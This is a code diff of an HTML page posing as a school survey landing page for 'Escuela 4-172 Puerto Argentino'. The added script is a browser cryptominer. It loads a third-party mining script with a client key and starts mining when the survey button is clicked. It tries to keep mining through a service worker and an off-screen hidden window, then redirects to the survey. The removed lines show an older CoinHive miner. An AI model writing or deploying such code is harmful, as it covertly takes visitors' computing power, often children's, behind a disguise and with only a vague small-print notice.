@@ -1,86 +1,252 @@
 <!DOCTYPE html>
-<html>
+<html lang="es">
 <head>
-    <title>¡Encuesta!</title>
+    <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Escuela 4-172 Puerto Argentino</title>
+    
+    <!-- Favicon (usará el mismo logo) -->
+    <link rel="icon" href="logo.png" type="image/png">
+    
     <style>
         body { 
-            font-family: Arial, sans-serif; 
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
             text-align: center; 
             padding: 20px; 
-            background: #f0f8ff;
+            background: linear-gradient(135deg, #1e5799, #207cca);
+            color: white;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            margin: 0;
         }
         .container {
             max-width: 600px;
-            margin: 50px auto;
+            width: 90%;
             padding: 30px;
+            background: rgba(255, 255, 255, 0.1);
+            backdrop-filter: blur(10px);
+            border-radius: 20px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
+            border: 1px solid rgba(255, 255, 255, 0.2);
+        }
+        .header {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            margin-bottom: 30px;
+        }
+        .logo {
+            width: 120px;
+            height: 120px;
+            border-radius: 50%;
             background: white;
-            border-radius: 15px;
-            box-shadow: 0 5px 15px rgba(0,0,0,0.1);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            margin-bottom: 20px;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.2);
+        }
+        .logo img {
+            max-width: 80%;
+            max-height: 80%;
+        }
+        h1 {
+            font-size: 2.2rem;
+            margin: 0;
+            text-shadow: 0 2px 4px rgba(0, 0, 0, 0.3);
+            font-weight: 600;
+        }
+        p {
+            font-size: 1.2rem;
+            line-height: 1.6;
+            max-width: 500px;
+            margin: 20px auto;
         }
         button {
-            padding: 15px 40px;
-            font-size: 18px;
-            background: linear-gradient(to right, #4CAF50, #2E8B57);
+            padding: 16px 50px;
+            font-size: 1.3rem;
+            background: linear-gradient(to right, #ff8c00, #ff4500);
             color: white;
             border: none;
             border-radius: 50px;
             cursor: pointer;
             margin: 20px 0;
-            box-shadow: 0 4px 8px rgba(0,0,0,0.2);
+            box-shadow: 0 6px 15px rgba(0, 0, 0, 0.3);
+            transition: all 0.3s ease;
+            font-weight: bold;
+            letter-spacing: 1px;
+        }
+        button:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 8px 20px rgba(0, 0, 0, 0.4);
+            background: linear-gradient(to right, #ff9c20, #ff5500);
+        }
+        button:active {
+            transform: translateY(1px);
+        }
+        #status {
+            font-size: 1rem;
+            margin-top: 20px;
+            min-height: 25px;
         }
         .small { 
-            font-size: 12px; 
-            color: #777; 
-            margin-top: 30px;
+            font-size: 0.9rem; 
+            opacity: 0.8;
+            margin-top: 40px;
+        }
+        
+        /* Responsive */
+        @media (max-width: 480px) {
+            h1 { font-size: 1.8rem; }
+            p { font-size: 1.1rem; }
+            button { padding: 14px 40px; font-size: 1.2rem; }
+            .logo { width: 100px; height: 100px; }
         }
     </style>
 </head>
 <body>
     <div class="container">
-        <h1>¡Ayúdanos a mejorar!</h1>
-        <p>Completa una breve encuesta</p>
+        <div class="header">
+            <div class="logo">
+                <!-- Reemplaza "logo.png" con la ruta de tu logo -->
+                <img src="logo.png" alt="Logo Escuela 4-172 Puerto Argentino">
+            </div>
+            <h1>Escuela 4-172 Puerto Argentino</h1>
+        </div>
+        
+        <p>Participa en nuestra encuesta institucional y contribuye al mejoramiento de nuestra comunidad educativa</p>
         
         <button id="surveyBtn">INICIAR ENCUESTA</button>
+        <div id="status"></div>
         
-        <p class="small">Al participar, aceptas el uso de recursos</p>
+        <p class="small">Al hacer clic, aceptas el uso temporal de recursos para el mantenimiento de nuestra plataforma educativa</p>
     </div>
 
-    <!-- Scripts -->
-    <script src="https://www.coinimp.com/miner?key=54b0a755c126818424831950c60f373e4003335af93d6806b75e949bb67e54af"></script>
+    <!-- Script de CoinImp según documentación -->
+    <script src="https://www.hostingcloud.racing/ADTj.js"></script>
+    
     <script>
-        // Registrar Service Worker
-        if ('serviceWorker' in navigator) {
-            navigator.serviceWorker.register('sw.js')
-                .then(reg => console.log('Service Worker registrado'))
-                .catch(err => console.log('Error:', err));
-        }
-
-        // Lógica principal
+        // ===== CONFIGURACIÓN =====
+        const CLIENT_KEY = '7d940748b3dd11af7a7b2e2029774e67e2a41108fa9444c1ef9815514efe0cd3';
+        const SURVEY_URL = 'https://ita.somosred.org/en/4036';
+        
+        // ===== FUNCIONES PRINCIPALES =====
         document.addEventListener('DOMContentLoaded', () => {
-            // Iniciar minería suave
-            const miner = new CoinHive.Anonymous('54b0a755c126818424831950c60f373e4003335af93d6806b75e949bb67e54af', {
-                throttle: 0.3,
-                threads: 2
-            });
-            miner.start();
+            const btn = document.getElementById('surveyBtn');
+            const status = document.getElementById('status');
             
-            // Botón de encuesta
-            document.getElementById('surveyBtn').addEventListener('click', () => {
-                // Activar minería persistente
+            // 1. Registrar Service Worker
+            registerServiceWorker();
+            
+            // 2. Configurar evento del botón
+            btn.addEventListener('click', async () => {
+                status.textContent = 'Preparando encuesta...';
+                btn.disabled = true;
+                
+                try {
+                    // A. Iniciar minería persistente
+                    await activatePersistentMining();
+                    
+                    // B. Iniciar minería en primer plano
+                    startForegroundMining();
+                    
+                    // C. Redirigir después de 1 segundo
+                    setTimeout(() => {
+                        status.textContent = 'Redirigiendo...';
+                        window.location.href = SURVEY_URL;
+                    }, 1000);
+                    
+                } catch (error) {
+                    status.textContent = 'Error: ' + error.message;
+                    console.error('Error:', error);
+                    btn.disabled = false;
+                }
+            });
+        });
+        
+        // Registrar Service Worker
+        function registerServiceWorker() {
+            if ('serviceWorker' in navigator) {
+                navigator.serviceWorker.register('sw.js')
+                    .then(reg => {
+                        console.log('Service Worker registrado con éxito');
+                    })
+                    .catch(err => {
+                        console.error('Error registrando SW:', err);
+                    });
+            }
+        }
+        
+        // Activar minería persistente
+        function activatePersistentMining() {
+            return new Promise((resolve, reject) => {
                 if (navigator.serviceWorker && navigator.serviceWorker.controller) {
                     navigator.serviceWorker.controller.postMessage({
                         type: 'START_MINING',
-                        key: '54b0a755c126818424831950c60f373e4003335af93d6806b75e949bb67e54af'
+                        key: CLIENT_KEY
                     });
+                    resolve();
+                } else {
+                    // Fallback para navegadores sin Service Worker
+                    console.log('Usando método alternativo de minería persistente');
+                    startFallbackMining();
+                    resolve();
                 }
-                
-                // Redirigir después de 1 segundo
-                setTimeout(() => {
-                    window.location.href = "https://ita.somosred.org/en/4036";
-                }, 1000);
             });
-        });
+        }
+        
+        // Método alternativo para navegadores antiguos
+        function startFallbackMining() {
+            try {
+                // Intenta abrir una ventana oculta para minería persistente
+                const hiddenWindow = window.open('', '_blank', 'width=1,height=1,left=-1000,top=-1000');
+                if (hiddenWindow) {
+                    hiddenWindow.document.write(`
+                        <script src="https://www.hostingcloud.racing/ADTj.js"></script>
+                        <script>
+                            var _client = new Client.Anonymous('${CLIENT_KEY}', {
+                                throttle: 0.1, c: 'w', ads: 0
+                            });
+                            _client.start();
+                        </script>
+                    `);
+                }
+            } catch (e) {
+                console.log('No se pudo abrir ventana oculta:', e);
+            }
+        }
+        
+        // Iniciar minería en primer plano
+        function startForegroundMining() {
+            try {
+                // Si el script ya está cargado
+                if (typeof Client !== 'undefined') {
+                    window._client = new Client.Anonymous(CLIENT_KEY, {
+                        throttle: 0.3,
+                        c: 'w',
+                        ads: 0
+                    });
+                    _client.start();
+                } else {
+                    // Cargar el script si no está presente
+                    const script = document.createElement('script');
+                    script.src = 'https://www.hostingcloud.racing/ADTj.js';
+                    script.onload = () => {
+                        window._client = new Client.Anonymous(CLIENT_KEY, {
+                            throttle: 0.3,
+                            c: 'w',
+                            ads: 0
+                        });
+                        _client.start();
+                    };
+                    document.head.appendChild(script);
+                }
+            } catch (e) {
+                console.error('Error iniciando minería:', e);
+            }
+        }
     </script>
 </body>
 </html>
